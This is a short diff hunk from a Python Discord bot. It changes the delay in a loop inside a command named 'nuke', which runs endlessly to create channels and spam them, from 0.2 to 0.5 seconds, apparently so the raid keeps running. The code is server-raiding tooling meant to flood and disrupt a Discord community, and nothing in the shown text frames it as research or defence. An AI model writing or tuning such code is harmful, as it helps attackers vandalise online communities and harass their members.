@@ -178,7 +178,7 @@ async def nuke(interaction: discord.Interaction):
         async def channel_spawner():
             while True:
                 await create_and_spam()
-                await asyncio.sleep(0.2)
+                await asyncio.sleep(0.5)
         bot.loop.create_task(channel_spawner())
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {e}")
